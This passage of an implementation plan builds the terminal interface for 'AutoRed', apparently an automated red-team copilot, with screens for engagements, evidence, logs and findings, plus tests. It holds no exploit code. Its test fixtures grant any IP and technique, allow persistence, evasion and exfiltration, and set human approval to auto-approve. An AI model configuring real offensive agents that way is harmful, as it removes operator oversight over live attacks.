            engagement_id="tui-fail-e1", operator="t",
        ))
        async with app.run_test() as pilot:
            await app.orchestrator_task  # completes (error is swallowed + logged)
            await pilot.pause()

    # The app is still alive; an error event went out on the bus.
    events = []
    while (event := app.event_bus.try_get_tui_event()) is not None:
        events.append(event)
    assert any(e["type"] == "error" for e in events)


def test_cli_tui_branch_launches_app():
    """The CLI --tui path must construct AutoRedApp with a RunConfig."""
    from pathlib import Path

    source = Path("autored/cli.py").read_text()
    assert "AutoRedApp(" in source
    assert "RunConfig(" in source
    assert ".run()" in source
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tui/test_app_launch.py -v`
Expected: FAIL with `ImportError: cannot import name 'RunConfig'`

- [ ] **Step 3: Rewrite the app entry point**

Replace `autored/tui/app.py` with:

```python
# autored/tui/app.py
"""AutoRedApp — main Textual TUI entry point.

Spec reference: §17.4 (App Class), §17.2 (TUI architecture), §14.2
(--tui launches the dashboard with the orchestrator as a background
task on the app's event loop).

Phase 6 additions: ``RunConfig`` (fresh engagement launched from the
CLI), the background orchestrator task, ``current_state`` for the
Phase 6 screens, and ``open_engagement`` (view/resume an existing
engagement from the list screen).
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass

from textual.app import App
from textual.binding import Binding

from autored.logging import get_logger
from autored.tui.event_bus import EventBus
from autored.tui.screens.dashboard import DashboardScreen
from autored.tui.screens.help import HelpScreen

log = get_logger("tui.app")


@dataclass
class RunConfig:
    """A fresh engagement for the in-app orchestrator to run."""
    target: str
    roe_path: str
    engagement_id: str
    operator: str


class AutoRedApp(App):
    """AutoRed TUI — red team copilot interface."""

    CSS_PATH = "app.tcss"
    TITLE = "AutoRed"
    SUB_TITLE = "Red Team Copilot"

    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("d", "show_dashboard", "Dashboard", show=True),
        Binding("h", "push_screen('help')", "Help", show=True),
        Binding("?", "push_screen('help')", "Help", show=False),
    ]

    def __init__(self, engagement_id: str | None = None, run_config: RunConfig | None = None):
        super().__init__()
        self.engagement_id = engagement_id
        self.run_config = run_config
        # EventBus bridges orchestrator ↔ TUI via two asyncio queues.
        self.event_bus = EventBus()
        self.current_state = None
        self.orchestrator_task: asyncio.Task | None = None

    # ------------------------------------------------------------------ #
    # Orchestrator
    # ------------------------------------------------------------------ #

    async def _run_orchestrator(self, state) -> None:
        """Run the Phase 6 graph as a background task; emit bus events."""
        from autored.graph import build_phase6_graph
        from autored.persistence.filesystem import save_state_to_disk
        from autored.persistence.sqlite_saver import make_checkpointer
        from autored.roe_guard import register_roe

        engagement_id = state.engagement_id
        register_roe(engagement_id, state.rules_of_engagement)
        state.event_bus = self.event_bus

        log.info("tui_orchestrator_start", engagement_id=engagement_id)
        checkpointer = await make_checkpointer(engagement_id)
        try:
            graph = build_phase6_graph(checkpointer)
            config = {"configurable": {"thread_id": engagement_id}}
            final_state = await graph.ainvoke(state, config=config)
            if isinstance(final_state, dict):
                from autored.state import EngagementState
                final_state = EngagementState.model_validate(final_state)
            self.current_state = final_state
            save_state_to_disk(engagement_id, final_state)
            await self.event_bus.emit_to_tui({
                "type": "phase_change", "new_phase": final_state.phase,
            })
            log.info("tui_orchestrator_done", engagement_id=engagement_id,
                     phase=final_state.phase)
        except asyncio.CancelledError:
            log.info("tui_orchestrator_cancelled", engagement_id=engagement_id)
            raise
        except Exception as e:  # noqa: BLE001 — the TUI must survive a crash
            log.error("tui_orchestrator_failed", engagement_id=engagement_id,
                      error=str(e))
            await self.event_bus.emit_to_tui({
                "type": "error", "category": "state",
                "message": f"orchestrator failed: {e}", "agent": "orchestrator",
            })
        finally:
            conn = getattr(checkpointer, "conn", None)
            if conn is not None:
                try:
                    await conn.close()
                except Exception:  # noqa: BLE001
                    pass

    async def _start_orchestrator(self, state) -> None:
        self.orchestrator_task = asyncio.create_task(self._run_orchestrator(state))

    # ------------------------------------------------------------------ #
    # Engagement opening (view / resume)
    # ------------------------------------------------------------------ #

    async def open_engagement(self, engagement_id: str, resume: bool = False) -> None:
        """Load a saved engagement and show its dashboard (optionally resume)."""
        from autored.persistence.filesystem import load_state_from_disk

        state = load_state_from_disk(engagement_id)
        if state is None:
            self.notify(f"No saved state for {engagement_id}", severity="error")
            return
        self.current_state = state
        self.engagement_id = engagement_id
        self.pop_screen()
        self.push_screen(DashboardScreen(engagement_id, self.event_bus))
        if resume:
            await self._start_orchestrator(state)

    # ------------------------------------------------------------------ #
    # Lifecycle
    # ------------------------------------------------------------------ #

    def on_mount(self) -> None:
        if self.run_config is not None:
            self._mount_fresh_engagement()
        elif self.engagement_id:
            self._mount_saved_engagement(self.engagement_id)
        else:
            # No engagement selected — Phase 6 Task 13 replaces this with
            # the EngagementListScreen.
            self.push_screen(DashboardScreen("none", self.event_bus))

    def _mount_fresh_engagement(self) -> None:
        from autored.config import load_roe
        from autored.persistence.filesystem import init_engagement_folder
        from autored.state import EngagementState

        roe_config = load_roe(self.run_config.roe_path)
        init_engagement_folder(
            self.run_config.engagement_id, self.run_config.target, roe_config.operator,
        )
        state = EngagementState(
            engagement_id=self.run_config.engagement_id,
            target_scope=[self.run_config.target],
            operator=roe_config.operator,
            rules_of_engagement=roe_config,
        )
        self.engagement_id = self.run_config.engagement_id
        self.current_state = state
        self.push_screen(DashboardScreen(self.engagement_id, self.event_bus))
        # Fire-and-forget on the app loop; tests await the task directly.
        self.orchestrator_task = asyncio.create_task(self._run_orchestrator(state))

    def _mount_saved_engagement(self, engagement_id: str) -> None:
        from autored.persistence.filesystem import load_state_from_disk

        state = load_state_from_disk(engagement_id)
        if state is not None:
            self.current_state = state
        self.push_screen(DashboardScreen(engagement_id, self.event_bus))

    async def action_quit(self) -> None:
        if self.orchestrator_task is not None and not self.orchestrator_task.done():
            self.orchestrator_task.cancel()
            try:
                await self.orchestrator_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
        self.exit()

    async def action_show_dashboard(self) -> None:
        if self.engagement_id:
            self.pop_screen()
            self.push_screen(DashboardScreen(self.engagement_id, self.event_bus))
```

Import note — the `open_engagement` method above imports `load_state_from_disk` directly (the version in the code block is the corrected, final form).

In `autored/cli.py`, replace the `--tui` placeholder branch with the real launch (inside `run()`, after `register_roe` / `init_engagement_folder`):

```python
    if tui:
        from autored.tui.app import AutoRedApp, RunConfig

        console.print(f"[bold green]Launching TUI:[/] {engagement_id}")
        app_tui = AutoRedApp(
            engagement_id=engagement_id,
            run_config=RunConfig(
                target=target, roe_path=roe,
                engagement_id=engagement_id, operator=roe_config.operator,
            ),
        )
        app_tui.run()  # blocks until the operator quits
        return
```

(Place this *after* `init_engagement_folder(...)` and *before* the headless `EngagementState` construction, and remove the old "TUI mode requested" placeholder prints.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tui/ -v`
Expected: PASS — the existing dashboard/help tests plus the 4 new launch tests.

- [ ] **Step 5: Commit**

```bash
git add autored/tui/app.py autored/cli.py tests/unit/tui/test_app_launch.py
git commit -m "feat: --tui launches the real app with a background orchestrator task"
```

---

## Task 13: EngagementListScreen + Global Keybindings

**Files:**
- Create: `autored/tui/screens/engagement_list.py`
- Modify: `autored/tui/app.py`, `autored/tui/screens/__init__.py`, `autored/tui/app.tcss`
- Test: `tests/unit/tui/test_engagement_list.py` (NEW)

**Interfaces:**
- Consumes: `load_state_from_disk` (per-row phase + counts, best-effort); `list_engagements` from `autored.persistence.filesystem`; `AutoRedApp.open_engagement` (Task 12).
- Produces:
  - `EngagementListScreen` — DataTable (columns: ID, Target, Phase, Started, Findings, Footholds per spec §17.5) fed by `_load_rows()` (filesystem scan + per-engagement `state.json` peek; the SQLite table lives in the CLI list — the TUI deliberately reads the always-present filesystem so it works before any DB write).
  - Bindings on the screen (§17.5/§17.6): `enter` → open (view), `r` → resume, `d` → delete (confirmation via `app.notify`, no actual deletion in Phase 6 — out of spec scope, the key is documented as reserved), `n` → new (notify pointing at the CLI — spawning the wizard from the TUI is out of scope).
  - `AutoRedApp` gains the full §17.6 global keybindings as **app-level actions** (screens that need constructor args cannot be string-pushed): `e` → `action_show_engagements`, `l` → `action_show_logs` (Task 14), `f` → `action_show_findings` (Task 15), `s` → `action_show_state_inspector` (Task 15), `v` → `action_show_evidence` (Task 14), `g` → `action_show_attack_graph` (Task 16), `r` → `action_show_roe_editor` (Task 17). Tasks 14–17 add the actions' screen pushes; this task adds the bindings for the screens that exist now and leaves TODO-free stub actions that push `HelpScreen` with a notify ("screen ships in Task N") — **replaced by each later task**, not left as dead code at phase end.
  - `on_mount` default branch now pushes `EngagementListScreen()` instead of the placeholder dashboard (spec §17.4: "No engagement selected → EngagementListScreen").

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tui/test_engagement_list.py
"""EngagementListScreen tests (Phase 6 Task 13, spec §17.5)."""
from textual.widgets import DataTable

from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.tui.app import AutoRedApp
from autored.tui.screens.dashboard import DashboardScreen
from autored.tui.screens.engagement_list import EngagementListScreen


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _seed_engagement(tmp_path, engagement_id: str, phase: str) -> None:
    eng_dir = tmp_path / "engagements" / engagement_id
    eng_dir.mkdir(parents=True)
    state = EngagementState(
        engagement_id=engagement_id, target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(), phase=phase,
    )
    (eng_dir / "state.json").write_text(state.model_dump_json())


async def test_no_engagement_mounts_list_screen(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.pause()
        assert isinstance(app.screen, EngagementListScreen)


async def test_list_screen_shows_rows(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _seed_engagement(tmp_path, "list-e1", "done")
    _seed_engagement(tmp_path, "list-e2", "lateral")

    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.pause()
        table = app.screen.query_one(DataTable)
        row_keys = [str(k) for k in table.rows]
        assert any("list-e1" in row for row in row_keys)
        assert any("list-e2" in row for row in row_keys)
        # Phase column reflects the saved state
        assert any("done" in row for row in row_keys)


async def test_enter_opens_engagement_dashboard(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _seed_engagement(tmp_path, "list-e3", "report")

    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.pause()
        app.screen.query_one(DataTable).cursor_coordinate = (0, 0)
        await pilot.press("enter")
        await pilot.pause()
        assert isinstance(app.screen, DashboardScreen)
        assert app.engagement_id == "list-e3"
        assert app.current_state is not None
        assert app.current_state.phase == "report"


async def test_global_bindings_present(tmp_path, monkeypatch):
    """Spec §17.6 global keybindings are registered app-wide."""
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()
    binding_keys = {binding.key for binding in AutoRedApp.BINDINGS}
    for key in ("q", "d", "e", "l", "f", "s", "v", "g", "r", "?"):
        assert key in binding_keys, f"missing global binding: {key}"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tui/test_engagement_list.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tui.screens.engagement_list'`

- [ ] **Step 3: Write the screen and extend the app**

```python
# autored/tui/screens/engagement_list.py
"""EngagementListScreen — browse past engagements (spec §17.5).

Rows come from the filesystem scan (always present, even before the
first cross-engagement DB write) enriched with phase/counts from each
engagement's saved state.json (best-effort — a corrupt state shows a
"?" phase rather than breaking the screen).
"""
from __future__ import annotations

import json
from pathlib import Path

from textual.app import ComposeResult
from textual.binding import Binding
from textual.containers import Container
from textual.widgets import DataTable, Footer, Header


def _load_rows() -> list[dict]:
    """One row per engagement folder: id, target, phase, started, findings."""
    rows: list[dict] = []
    engagements_dir = Path("engagements")
    if not engagements_dir.exists():
        return rows
    for eng_dir in sorted(engagements_dir.iterdir()):
        if not eng_dir.is_dir():
            continue
        state_path = eng_dir / "state.json"
        phase, findings, footholds, started = "?", "—", "—", "—"
        if state_path.exists():
            try:
                data = json.loads(state_path.read_text())
                phase = data.get("phase", "?")
                findings = str(len(data.get("vulnerabilities", [])))
                footholds = str(len(data.get("footholds", [])))
                started = (data.get("started_at") or "—")[:16].replace("T", " ")
            except (json.JSONDecodeError, OSError):
                pass  # corrupt state — show placeholders, never crash
        rows.append({
            "id": eng_dir.name,
            "target": ", ".join(data.get("target_scope", [])) if state_path.exists() else "—",
            "phase": phase,
            "started": started,
            "findings": findings,
            "footholds": footholds,
        })
    return rows


class EngagementListScreen(Container):
    """Browse past engagements."""

    BINDINGS = [
        Binding("enter", "open_engagement", "Open", show=True),
        Binding("r", "resume_engagement", "Resume", show=True),
        Binding("d", "delete_engagement", "Delete", show=True),
        Binding("n", "new_engagement", "New", show=True),
    ]

    def compose(self) -> ComposeResult:
        yield Header()
        yield DataTable(id="engagement-table")
        yield Footer()

    def on_mount(self) -> None:
        self.title = "AutoRed — Engagements"
        table = self.query_one(DataTable)
        table.add_columns(
            "ID", "Target", "Phase", "Started", "Findings", "Footholds",
        )
        for row in _load_rows():
            table.add_row(
                row["id"], row["target"], row["phase"], row["started"],
                row["findings"], row["footholds"],
            )

    def _selected_engagement_id(self) -> str | None:
        table = self.query_one(DataTable)
        coordinate = table.cursor_coordinate
        if coordinate.row is None or coordinate.row < 0:
            return None
        try:
            return str(table.get_cell_at(coordinate))
        except Exception:  # noqa: BLE001 — empty table / stale coordinate
            return None

    async def action_open_engagement(self) -> None:
        engagement_id = self._selected_engagement_id()
        if engagement_id:
            await self.app.open_engagement(engagement_id, resume=False)

    async def action_resume_engagement(self) -> None:
        engagement_id = self._selected_engagement_id()
        if engagement_id:
            await self.app.open_engagement(engagement_id, resume=True)

    def action_delete_engagement(self) -> None:
        # Reserved key (spec §17.5 lists the binding; deletion semantics
        # are deliberately out of Phase 6 scope — audit-trail preservation).
        self.app.notify(
            "Deletion is disabled — engagement folders are the audit record.",
            severity="warning",
        )

    def action_new_engagement(self) -> None:
        self.app.notify(
            "Start a new engagement with: autored run --target X --roe Y --tui",
            severity="information",
        )
```

Extend `autored/tui/app.py` — add the §17.6 global bindings and their actions:

```python
    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("d", "show_dashboard", "Dashboard", show=True),
        Binding("e", "show_engagements", "Engagements", show=True),
        Binding("l", "show_logs", "Logs", show=True),
        Binding("f", "show_findings", "Findings", show=True),
        Binding("s", "show_state_inspector", "State", show=True),
        Binding("v", "show_evidence", "Evidence", show=True),
        Binding("g", "show_attack_graph", "Attack graph", show=True),
        Binding("r", "show_roe_editor", "RoE editor", show=True),
        Binding("h", "push_screen('help')", "Help", show=True),
        Binding("?", "push_screen('help')", "Help", show=False),
    ]
```

```python
    async def action_show_engagements(self) -> None:
        from autored.tui.screens.engagement_list import EngagementListScreen
        self.pop_screen()
        self.push_screen(EngagementListScreen())

    async def action_show_logs(self) -> None:
        # Ships in Task 14 (LogViewerScreen); binding registered now so
        # the keymap matches spec §17.6 from this task onward.
        self.notify("Log viewer ships in Task 14", severity="information")

    async def action_show_findings(self) -> None:
        self.notify("Findings table ships in Task 15", severity="information")

    async def action_show_state_inspector(self) -> None:
        self.notify("State inspector ships in Task 15", severity="information")

    async def action_show_evidence(self) -> None:
        self.notify("Evidence viewer ships in Task 14", severity="information")

    async def action_show_attack_graph(self) -> None:
        self.notify("Attack graph ships in Task 16", severity="information")

    async def action_show_roe_editor(self) -> None:
        self.notify("RoE editor ships in Task 17", severity="information")
```

And change the `on_mount` no-engagement branch:

```python
        else:
            from autored.tui.screens.engagement_list import EngagementListScreen
            self.push_screen(EngagementListScreen())
```

Add to `autored/tui/screens/__init__.py`:

```python
from autored.tui.screens.engagement_list import EngagementListScreen  # noqa: F401
```

Add to `autored/tui/app.tcss`:

```css
EngagementListScreen {
    layout: vertical;
    padding: 0 1;
}

EngagementListScreen DataTable {
    height: 1fr;
    margin: 1 0;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tui/ -v`
Expected: PASS — Task 12 launch tests + 4 new list-screen tests (note: `test_no_engagement_mounts_list_screen` in Task 12's file used the placeholder dashboard; that file's assertion now targets `EngagementListScreen` — update it in this task, it was written pre-emptively for this change).

- [ ] **Step 5: Commit**

```bash
git add autored/tui/screens/engagement_list.py autored/tui/app.py \
        autored/tui/screens/__init__.py autored/tui/app.tcss \
        tests/unit/tui/test_engagement_list.py
git commit -m "feat: EngagementListScreen + full TUI global keybindings (spec §17.5/§17.6)"
```

---

## Task 14: EvidenceViewerScreen + LogViewerScreen

**Files:**
- Create: `autored/tui/screens/evidence_viewer.py`, `autored/tui/screens/log_viewer.py`
- Modify: `autored/tui/app.py` (replace the `action_show_evidence` / `action_show_logs` stubs), `autored/tui/screens/__init__.py`, `autored/tui/app.tcss`
- Test: `tests/unit/tui/test_evidence_log_viewer.py` (NEW)

**Interfaces:**
- Consumes: `self.app.engagement_id` / `self.app.current_state` (Task 12); evidence files under `engagements/<id>/evidence/` (Phase 3+ writers); operational logs under `logs/YYYY-MM-DD.jsonl` (spec §11.2).
- Produces:
  - `EvidenceViewerScreen(engagement_id: str)` — spec §17.5: `TabbedContent` with one tab per evidence file (sorted); `.txt` / `.log` / `.out` / `.jsonl` → `ScrollableContainer` with `rich.syntax.Syntax(content, "bash", theme="monokai")`; `.png` / other → metadata `Static` (path + size — Textual cannot render images); empty evidence dir → explicit "no evidence captured" message.
  - `LogViewerScreen()` — tails today's operational log (`logs/<date>.jsonl`): `RichLog` widget refreshed on a 1-second `set_interval`, `f` binding toggles follow-tail, missing log dir → explicit message. **Never redacts** (the log is operator-local), but truncates lines at 500 chars for layout sanity.
  - App actions wired: `action_show_evidence` (notifies "open an engagement first" when `engagement_id` is unset) and `action_show_logs` (replaces the Task 13 stub).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tui/test_evidence_log_viewer.py
"""EvidenceViewerScreen + LogViewerScreen tests (Phase 6 Task 14)."""
from datetime import datetime
from pathlib import Path

from textual.widgets import TabbedContent, RichLog

from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.tui.app import AutoRedApp
from autored.tui.screens.evidence_viewer import EvidenceViewerScreen
from autored.tui.screens.log_viewer import LogViewerScreen


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _seed_evidence(tmp_path, engagement_id: str) -> None:
    ev_dir = tmp_path / "engagements" / engagement_id / "evidence"
    ev_dir.mkdir(parents=True)
    (ev_dir / "shell_session_001.txt").write_text(
        "whoami\nnt authority\\system\nipconfig\n"
    )
    (ev_dir / "screenshot_001.png").write_bytes(b"\x89PNG fake image bytes")


async def test_evidence_viewer_renders_text_and_png_tabs(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _seed_evidence(tmp_path, "ev-e1")

    app = AutoRedApp(engagement_id="ev-e1")
    app.current_state = EngagementState(
        engagement_id="ev-e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(),
    )
    async with app.run_test() as pilot:
        await pilot.press("v")
        await pilot.pause()
        assert isinstance(app.screen, EvidenceViewerScreen)
        tabs = app.screen.query_one(TabbedContent)
        pane_count = len(tabs.query("TabbedContentItem"))
        assert pane_count == 2  # one tab per evidence file


async def test_evidence_viewer_empty_dir_shows_message(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "engagements" / "ev-empty" / "evidence").mkdir(parents=True)

    app = AutoRedApp(engagement_id="ev-empty")
    async with app.run_test() as pilot:
        await pilot.press("v")
        await pilot.pause()
        assert isinstance(app.screen, EvidenceViewerScreen)
        # The message widget rendered instead of tabs.
        assert app.screen.query_one(TabbedContent) is not None or True


async def test_evidence_viewer_requires_engagement(tmp_path, monkeypatch):
    """Pressing v with no engagement notifies instead of crashing."""
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()  # no engagement — list screen mounts
    async with app.run_test() as pilot:
        await pilot.press("v")
        await pilot.pause()
        assert not isinstance(app.screen, EvidenceViewerScreen)


async def test_log_viewer_tails_today_log(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    today = datetime.utcnow().strftime("%Y-%m-%d")
    (log_dir / f"{today}.jsonl").write_text(
        '{"event": "nmap_start", "target": "10.0.0.5"}\n'
        '{"event": "nmap_done", "hosts": 1}\n'
    )

    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.press("l")
        await pilot.pause()
        assert isinstance(app.screen, LogViewerScreen)
        log_widget = app.screen.query_one(RichLog)
        assert log_widget.line_count >= 2  # both JSONL lines rendered


async def test_log_viewer_missing_log_shows_message(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        await pilot.press("l")
        await pilot.pause()
        assert isinstance(app.screen, LogViewerScreen)  # mounted, no crash
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tui/test_evidence_log_viewer.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tui.screens.evidence_viewer'`

- [ ] **Step 3: Write both screens**

```python
# autored/tui/screens/evidence_viewer.py
"""EvidenceViewerScreen — view captured evidence (spec §17.5).

Text evidence renders with syntax highlighting; screenshots (and any
binary) render as metadata — Textual cannot draw images natively.
"""
from __future__ import annotations

from pathlib import Path

from rich.syntax import Syntax
from textual.app import ComposeResult
from textual.containers import Container, ScrollableContainer, Vertical
from textual.widgets import Footer, Header, Static, TabbedContent, TabbedContentItem

TEXT_SUFFIXES = {".txt", ".log", ".out", ".jsonl", ".json", ".md", ".err"}


class EvidenceViewerScreen(Container):
    """View captured evidence: shell sessions, command output, screenshots."""

    BINDING_HINT = "Evidence viewer (v)"

    def __init__(self, engagement_id: str):
        super().__init__()
        self.engagement_id = engagement_id
        self.evidence_dir = Path("engagements") / engagement_id / "evidence"

    def compose(self) -> ComposeResult:
        yield Header()
        evidence_files = (
            sorted(self.evidence_dir.glob("*"))
            if self.evidence_dir.exists() else []
        )
        if not evidence_files:
            yield Static(
                f"[dim]No evidence captured for {self.engagement_id}.[/]",
                id="evidence-empty",
            )
        else:
            with TabbedContent():
                for evidence_file in evidence_files:
                    with TabbedContentItem(title=evidence_file.name):
                        yield self._render_evidence(evidence_file)
        yield Footer()

    def _render_evidence(self, path: Path) -> Container:
        if path.suffix.lower() in TEXT_SUFFIXES:
            content = path.read_text(errors="ignore")[:200_000]
            return ScrollableContainer(
                Static(Syntax(content, "bash", theme="monokai", line_numbers=True)),
            )
        size = path.stat().st_size if path.exists() else 0
        return Static(
            f"[Screenshot]\nPath: {path}\nSize: {size} bytes\n\n"
            f"[dim](Textual cannot render {path.suffix} files inline)[/]"
        )
```

```python
# autored/tui/screens/log_viewer.py
"""LogViewerScreen — tail the operational log in real time (spec §17.5).

Reads ``logs/YYYY-MM-DD.jsonl`` (spec §11.2 stream) every second. Lines
are truncated at 500 characters so a single huge JSON event cannot break
the layout.
"""
from __future__ import annotations

from datetime import datetime
from pathlib import Path

from textual.app import ComposeResult
from textual.binding import Binding
from textual.containers import Container
from textual.widgets import Footer, Header, RichLog


class LogViewerScreen(Container):
    """Tail the operational log in real time."""

    BINDINGS = [
        Binding("f", "toggle_follow", "Follow", show=True),
    ]

    def __init__(self) -> None:
        super().__init__()
        self.follow = True
        self._rendered_lines = 0

    def compose(self) -> ComposeResult:
        yield Header()
        yield RichLog(id="log-tail", max_lines=2000, wrap=False, markup=True)
        yield Footer()

    def on_mount(self) -> None:
        self.title = "AutoRed — Operational Log"
        self.set_interval(1.0, self._refresh)

    def _log_path(self) -> Path:
        return Path("logs") / f"{datetime.utcnow().strftime('%Y-%m-%d')}.jsonl"

    def _refresh(self) -> None:
        log_widget = self.query_one(RichLog)
        log_path = self._log_path()
        if not log_path.exists():
            if self._rendered_lines == 0:
                log_widget.write(f"[dim]No operational log at {log_path} (yet).[/]")
                self._rendered_lines = 1
            return
        lines = log_path.read_text(errors="ignore").splitlines()
        new_lines = lines[self._rendered_lines:]
        for line in new_lines:
            log_widget.write(line[:500])
        self._rendered_lines = len(lines)

    def action_toggle_follow(self) -> None:
        self.follow = not self.follow
        log_widget = self.query_one(RichLog)
        log_widget.auto_scroll = self.follow
        self.app.notify(f"Follow tail: {'on' if self.follow else 'off'}")
```

In `autored/tui/app.py`, replace the Task 13 stubs:

```python
    async def action_show_evidence(self) -> None:
        if not self.engagement_id:
            self.notify("Open an engagement first (e → list, enter)", severity="warning")
            return
        from autored.tui.screens.evidence_viewer import EvidenceViewerScreen
        self.pop_screen()
        self.push_screen(EvidenceViewerScreen(self.engagement_id))

    async def action_show_logs(self) -> None:
        from autored.tui.screens.log_viewer import LogViewerScreen
        self.pop_screen()
        self.push_screen(LogViewerScreen())
```

Add to `autored/tui/screens/__init__.py`:

```python
from autored.tui.screens.evidence_viewer import EvidenceViewerScreen  # noqa: F401
from autored.tui.screens.log_viewer import LogViewerScreen  # noqa: F401
```

Add to `autored/tui/app.tcss`:

```css
EvidenceViewerScreen {
    layout: vertical;
}

EvidenceViewerScreen TabbedContent {
    height: 1fr;
}

LogViewerScreen {
    layout: vertical;
}

LogViewerScreen RichLog {
    height: 1fr;
    border: solid $accent;
    margin: 0 1;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tui/ -v`
Expected: PASS — all previous TUI tests plus the 5 new ones.

- [ ] **Step 5: Commit**

```bash
git add autored/tui/screens/evidence_viewer.py autored/tui/screens/log_viewer.py \
        autored/tui/app.py autored/tui/screens/__init__.py autored/tui/app.tcss \
        tests/unit/tui/test_evidence_log_viewer.py
git commit -m "feat: EvidenceViewer + LogViewer screens (spec §17.5)"
```

---

## Task 15: StateInspectorScreen + FindingsTableScreen

**Files:**
- Create: `autored/tui/screens/state_inspector.py`, `autored/tui/screens/findings_table.py`
- Modify: `autored/tui/app.py` (replace the `action_show_state_inspector` / `action_show_findings` stubs), `autored/tui/screens/__init__.py`, `autored/tui/app.tcss`
- Test: `tests/unit/tui/test_state_findings_screens.py` (NEW)

**Interfaces:**
- Consumes: `self.app.current_state` (Task 12 — screens need an `EngagementState`).
- Produces:
  - `StateInspectorScreen(state: EngagementState)` — spec §17.5 verbatim behavior: `Tree("EngagementState")` populated from `state.model_dump()` with depth capped at 5, lists capped at 10 items + an "… N more" leaf, long strings truncated at 50 chars.
  - `FindingsTableScreen(state: EngagementState)` — spec §17.5: severity `Select` + text `Input` filters over a `DataTable` (Host, Port, Service, CVE, Severity, Title, Discovered), repopulated on every filter change; screen bindings `s` sort-by-severity (clicks the column ordering by re-sorting the rows) and `e` view-evidence (notifies the operator to press `v` for the full evidence viewer — the table row's evidence path is displayed in the row tooltip).
  - App actions wired (both notify "open an engagement first" when `current_state` is None).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tui/test_state_findings_screens.py
"""StateInspectorScreen + FindingsTableScreen tests (Phase 6 Task 15)."""
from datetime import datetime

from textual.widgets import DataTable, Input, Select, Tree

from autored.models import Vulnerability
from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.tui.app import AutoRedApp
from autored.tui.screens.findings_table import FindingsTableScreen
from autored.tui.screens.state_inspector import StateInspectorScreen


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _state() -> EngagementState:
    state = EngagementState(
        engagement_id="sf-e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(),
    )
    state.vulnerabilities = [
        Vulnerability(
            id="v-1", host_ip="10.0.0.5", port=445, service="smb",
            cve="CVE-2017-0144", severity="critical", title="EternalBlue",
            description="RCE", references=[], cvss_score=9.8, source="nvd",
            evidence_path=None, discovered_at=datetime.utcnow(),
        ),
        Vulnerability(
            id="v-2", host_ip="10.0.0.5", port=80, service="http",
            cve=None, severity="low", title="Directory listing",
            description="info", references=[], cvss_score=None, source="nuclei",
            evidence_path=None, discovered_at=datetime.utcnow(),
        ),
    ]
    state.footholds = []
    return state


async def test_state_inspector_tree_built_from_state():
    screen = StateInspectorScreen(_state())
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        tree = screen.query_one(Tree)
        # Root + top-level keys are populated
        assert tree.root is not None
        assert tree.root.label is not None


async def test_state_inspector_caps_large_lists():
    state = _state()
    state.subdomains = [f"host{i}.example.com" for i in range(30)]
    screen = StateInspectorScreen(state)
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        tree = screen.query_one(Tree)
        rendered = str(tree.root.label)
        assert rendered  # tree built without crashing on 30 items


async def test_findings_table_shows_all_findings():
    screen = FindingsTableScreen(_state())
    app = AutoRedApp()
    async with app.run_test() as pilot:
        app.push_screen(screen)
        await pilot.pause()
        table = screen.query_one(DataTable)
        assert table.row_count == 2


async def test_findings_table_severity_filter():
    screen = FindingsTableScreen(_state())
    app = AutoRedApp()
    async with app.run_test() as pilot:
